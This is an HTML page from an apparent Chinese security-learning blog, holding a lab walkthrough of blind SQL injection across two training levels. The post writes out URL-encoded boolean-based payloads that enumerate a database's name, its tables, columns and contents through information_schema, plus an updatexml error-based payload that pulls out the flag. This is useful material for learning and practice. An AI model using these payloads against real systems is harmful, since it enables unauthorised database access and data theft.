@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+
+  
+  <title>盲注 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="先提几个函数： length() 返回字符串函数 substr()截取字符串 ascii() 返回字符的ascii码 sleep()将程序挂起一段时间 iarf(expr1,expr2,expr3)判断语句  打开第一关的靶场：打开第一关的靶场：  根据提示:  1.先加引号， 发现有爆出sql语句，仿照报错注入进行操作，先进行 order by 确定字段数量。  2、找回显点。  3.发现没有任">
+<meta property="og:type" content="article">
+<meta property="og:title" content="盲注">
+<meta property="og:url" content="http://yoursite.com/2019/10/20/盲注/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="先提几个函数： length() 返回字符串函数 substr()截取字符串 ascii() 返回字符的ascii码 sleep()将程序挂起一段时间 iarf(expr1,expr2,expr3)判断语句  打开第一关的靶场：打开第一关的靶场：  根据提示:  1.先加引号， 发现有爆出sql语句，仿照报错注入进行操作，先进行 order by 确定字段数量。  2、找回显点。  3.发现没有任">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="http://yoursite.com/upload/md/52be0dc0a320828b3d2658d1b6f8af9a_12349.png">
+<meta property="og:image" content="http://yoursite.com/upload/md/63440796348c584ce89b921769841fb3_51912.png">
+<meta property="og:image" content="http://yoursite.com/upload/md/401eb3d12f1e782dbd34c35cd38f741f_99610.png">
+<meta property="og:image" content="http://yoursite.com/upload/md/37bcd887937403cb476e6ea2e45546f9_72083.png">
+<meta property="og:image" content="http://yoursite.com/upload/md/ab53cef5691fc77e50538722a641e061_67763.png">
+<meta property="og:image" content="http://yoursite.com/upload/md/382a3f44bbf6140483d66ebdd62435bc_27360.png">
+<meta property="og:image" content="http://yoursite.com/upload/md/1cb9f7cd22a8535d904fe6ac416ce77f_24383.png">
+<meta property="og:image" content="http://yoursite.com/upload/md/f156674d5b76ae12cce9f6bc6bf6393d_22639.png">
+<meta property="og:image" content="http://yoursite.com/upload/md/bdef5fbd0dbe5145d154a693c3b4f140_81323.png">
+<meta property="og:image" content="http://yoursite.com/upload/md/2d269e5485ec02ed22ebe8b13432f4a1_60312.png">
+<meta property="og:updated_time" content="2019-10-20T13:42:41.321Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="盲注">
+<meta name="twitter:description" content="先提几个函数： length() 返回字符串函数 substr()截取字符串 ascii() 返回字符的ascii码 sleep()将程序挂起一段时间 iarf(expr1,expr2,expr3)判断语句  打开第一关的靶场：打开第一关的靶场：  根据提示:  1.先加引号， 发现有爆出sql语句，仿照报错注入进行操作，先进行 order by 确定字段数量。  2、找回显点。  3.发现没有任">
+<meta name="twitter:image" content="http://yoursite.com/upload/md/52be0dc0a320828b3d2658d1b6f8af9a_12349.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-盲注" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/10/20/盲注/" class="article-date">
+  <time datetime="2019-10-20T13:41:52.000Z" itemprop="datePublished">2019-10-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      盲注
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>先提几个函数： length() 返回字符串函数 substr()截取字符串 ascii() 返回字符的ascii码 sleep()将程序挂起一段时间 iarf(expr1,expr2,expr3)判断语句 </p>
+<h1 id="打开第一关的靶场：打开第一关的靶场：-根据提示-1-先加引号，-发现有爆出sql语句，仿照报错注入进行操作，先进行-order-by-确定字段数量。-2、找回显点。-3-发现没有任何的回显，此时运用盲注，进行对表结构。-4-猜解数据库的名称：-判断数据长度-id-1-27-20and-20if-LENGTH-select-20database-number-1-0-23-当number-8时，有正确的回显，所以数据库的长度为8-2-gt-判断数据库名称：id-1-27-20and-20if-ascii-SUBSTR-select-20database-payload-a-1-payload-b-1-0-23-数据库名称为：security-5-猜解表名（其实可以完全不用猜解库名名）：-1-gt-猜解表的长度id-1-27-20and-20if-LENGTH-select-20information-schema-TABLES-TABLE-NAME-20FROM-20information-schema-TABLES-20where-20information-schema-TABLES-TABLE-SCHEMA-select-20database-20limit-200-1-6-1-0-23-当长度为6时没有报错，说明第一个表的长度为6-接下来就是猜表名了：id-1-27-20and-20if-ascii-SUBSTR-select-20information-schema-TABLES-TABLE-NAME-20FROM-20information-schema-TABLES-20where-20information-schema-TABLES-TABLE-SCHEMA-select-20database-20limit-200-1-1-1-101-1-0-23-当ascii值为101的时候没有报错，说明此表的第一个字符为e。-最终得出表名-emails-referers-uagents-users-zkaq-四：猜字段：and-ascii-substr-select-column-name-from-information-schema-columns-where-table-name-’zkaq’-limit-0-1-1-1-x-–-得到列名：flag，zKaQ-猜内容：and-ascii-substr-select-zKaQ-from-zkaq-limit-4-1-1-1-x–-id-1’-or-updatexml-1-concat-0x7e-select-zKaQ-from-zkaq-where-flag-6-0x7e-1-23-得到flag"><a href="#打开第一关的靶场：打开第一关的靶场：-根据提示-1-先加引号，-发现有爆出sql语句，仿照报错注入进行操作，先进行-order-by-确定字段数量。-2、找回显点。-3-发现没有任何的回显，此时运用盲注，进行对表结构。-4-猜解数据库的名称：-判断数据长度-id-1-27-20and-20if-LENGTH-select-20database-number-1-0-23-当number-8时，有正确的回显，所以数据库的长度为8-2-gt-判断数据库名称：id-1-27-20and-20if-ascii-SUBSTR-select-20database-payload-a-1-payload-b-1-0-23-数据库名称为：security-5-猜解表名（其实可以完全不用猜解库名名）：-1-gt-猜解表的长度id-1-27-20and-20if-LENGTH-select-20information-schema-TABLES-TABLE-NAME-20FROM-20information-schema-TABLES-20where-20information-schema-TABLES-TABLE-SCHEMA-select-20database-20limit-200-1-6-1-0-23-当长度为6时没有报错，说明第一个表的长度为6-接下来就是猜表名了：id-1-27-20and-20if-ascii-SUBSTR-select-20information-schema-TABLES-TABLE-NAME-20FROM-20information-schema-TABLES-20where-20information-schema-TABLES-TABLE-SCHEMA-select-20database-20limit-200-1-1-1-101-1-0-23-当ascii值为101的时候没有报错，说明此表的第一个字符为e。-最终得出表名-emails-referers-uagents-users-zkaq-四：猜字段：and-ascii-substr-select-column-name-from-information-schema-columns-where-table-name-’zkaq’-limit-0-1-1-1-x-–-得到列名：flag，zKaQ-猜内容：and-ascii-substr-select-zKaQ-from-zkaq-limit-4-1-1-1-x–-id-1’-or-updatexml-1-concat-0x7e-select-zKaQ-from-zkaq-where-flag-6-0x7e-1-23-得到flag" class="headerlink" title="打开第一关的靶场：打开第一关的靶场：  根据提示:  1.先加引号， 发现有爆出sql语句，仿照报错注入进行操作，先进行 order by 确定字段数量。  2、找回显点。  3.发现没有任何的回显，此时运用盲注，进行对表结构。 4.猜解数据库的名称： 判断数据长度: id=1%27%20and%20if(LENGTH((select%20database()))=number,1,0)%23 当number=8时，有正确的回显，所以数据库的长度为8  2.&gt;判断数据库名称：id=1%27%20and%20if(ascii(SUBSTR((select%20database()),payload_a,1))=payload_b,1,0)%23 数据库名称为：security 5.猜解表名（其实可以完全不用猜解库名名）： 1.&gt;猜解表的长度id=1%27%20and%20if(LENGTH((select%20information_schema.TABLES.TABLE_NAME%20FROM%20information_schema.TABLES%20where%20information_schema.TABLES.TABLE_SCHEMA=(select%20database())%20limit%200,1))=6,1,0)%23  当长度为6时没有报错，说明第一个表的长度为6 接下来就是猜表名了：id=1%27%20and%20if(ascii(SUBSTR((select%20information_schema.TABLES.TABLE_NAME%20FROM%20information_schema.TABLES%20where%20information_schema.TABLES.TABLE_SCHEMA=(select%20database())%20limit%200,1),1,1))=101,1,0)%23  当ascii值为101的时候没有报错，说明此表的第一个字符为e。 最终得出表名:emails,referers,uagents,users,zkaq 四：猜字段：and (ascii(substr((select column_name from information_schema.columns where table_name=’zkaq’ limit 0,1),1,1)))=x –+ 得到列名：flag，zKaQ 猜内容：and (ascii(substr(( select zKaQ from zkaq limit 4,1),1,1)))=x–+ id=1’ or updatexml(1,concat(0x7e,(select zKaQ from zkaq where flag=6),0x7e),1)%23 得到flag "></a>打开第一关的靶场：打开第一关的靶场： <img src="/upload/md/52be0dc0a320828b3d2658d1b6f8af9a_12349.png" alt> 根据提示: <img src="/upload/md/63440796348c584ce89b921769841fb3_51912.png" alt> 1.先加引号， 发现有爆出sql语句，仿照报错注入进行操作，先进行 order by 确定字段数量。 <img src="/upload/md/401eb3d12f1e782dbd34c35cd38f741f_99610.png" alt> 2、找回显点。 <img src="/upload/md/37bcd887937403cb476e6ea2e45546f9_72083.png" alt> 3.发现没有任何的回显，此时运用盲注，进行对表结构。 4.猜解数据库的名称： 判断数据长度: id=1%27%20and%20if(LENGTH((select%20database()))=number,1,0)%23 当number=8时，有正确的回显，所以数据库的长度为8 <img src="/upload/md/ab53cef5691fc77e50538722a641e061_67763.png" alt> 2.&gt;判断数据库名称：id=1%27%20and%20if(ascii(SUBSTR((select%20database()),payload_a,1))=payload_b,1,0)%23 数据库名称为：security 5.猜解表名（其实可以完全不用猜解库名名）： 1.&gt;猜解表的长度id=1%27%20and%20if(LENGTH((select%20information_schema.<code>TABLES</code>.TABLE_NAME%20FROM%20information_schema.<code>TABLES</code>%20where%20information_schema.<code>TABLES</code>.TABLE_SCHEMA=(select%20database())%20limit%200,1))=6,1,0)%23 <img src="/upload/md/382a3f44bbf6140483d66ebdd62435bc_27360.png" alt> 当长度为6时没有报错，说明第一个表的长度为6 接下来就是猜表名了：id=1%27%20and%20if(ascii(SUBSTR((select%20information_schema.<code>TABLES</code>.TABLE_NAME%20FROM%20information_schema.<code>TABLES</code>%20where%20information_schema.<code>TABLES</code>.TABLE_SCHEMA=(select%20database())%20limit%200,1),1,1))=101,1,0)%23 <img src="/upload/md/1cb9f7cd22a8535d904fe6ac416ce77f_24383.png" alt> 当ascii值为101的时候没有报错，说明此表的第一个字符为e。 最终得出表名:emails,referers,uagents,users,zkaq 四：猜字段：and (ascii(substr((select column_name from information_schema.columns where table_name=’zkaq’ limit 0,1),1,1)))=x –+ 得到列名：flag，zKaQ 猜内容：and (ascii(substr(( select zKaQ from zkaq limit 4,1),1,1)))=x–+ id=1’ or updatexml(1,concat(0x7e,(select zKaQ from zkaq where flag=6),0x7e),1)%23 得到flag <img src="/upload/md/f156674d5b76ae12cce9f6bc6bf6393d_22639.png" alt></h1><h2 id="打开第二关的靶场"><a href="#打开第二关的靶场" class="headerlink" title="打开第二关的靶场"></a>打开第二关的靶场</h2><p><img src="/upload/md/bdef5fbd0dbe5145d154a693c3b4f140_81323.png" alt> 我们发现是用双引号闭合的，其他的做法和第一关一样， 附上flag: <img src="/upload/md/2d269e5485ec02ed22ebe8b13432f4a1_60312.png" alt></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/10/20/盲注/" data-id="ck1z1u11a000fycv0mumvyxsa" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2019/10/20/宽字节注入/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          宽字节注入
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/10/20/显错注入/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">显错注入</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2019/10/20/csrf/">csrf</a>
+          </li>
+        
+          <li>
+            <a href="/2019/10/20/dom型xss/">dom型xss</a>
+          </li>
+        
+          <li>
+            <a href="/2019/10/20/存储型xss/">存储型xss</a>
+          </li>
+        
+          <li>
+            <a href="/2019/10/20/反射性xss/">反射性xss</a>
+          </li>
+        
+          <li>
+            <a href="/2019/10/20/dns注入/">dns注入</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2019 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
